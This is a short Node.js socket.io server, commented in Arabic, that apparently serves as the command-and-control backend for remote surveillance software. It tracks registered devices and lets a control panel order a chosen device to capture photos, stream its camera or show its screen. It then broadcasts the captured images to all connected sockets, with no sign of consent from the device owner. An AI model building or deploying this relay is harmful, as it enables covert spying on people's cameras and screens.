const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" } });

app.use(cors());
app.use(express.static(__dirname));

// مخزن للأجهزة النشطة
let activeDevices = {};

io.on('connection', (socket) => {
    // إرسال الأجهزة المخزنة فور فتح لوحة التحكم
    socket.emit('clients-update', Object.keys(activeDevices));

    socket.on('register', (data) => {
        socket.deviceId = data.deviceId;
        activeDevices[socket.id] = data.deviceId;
        io.emit('clients-update', Object.keys(activeDevices));
    });

    // تمرير الأوامر للجهاز المطلوب
    socket.on('capture-photos', (id) => io.to(id).emit('capture-photos'));
    socket.on('live-camera', (id) => io.to(id).emit('live-camera'));
    socket.on('view-screen', (id) => io.to(id).emit('view-screen'));

    socket.on('photo-data', (data) => io.emit('photos-captured', data));

    socket.on('disconnect', () => {
        delete activeDevices[socket.id];
        io.emit('clients-update', Object.keys(activeDevices));
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`Server on ${PORT}`));
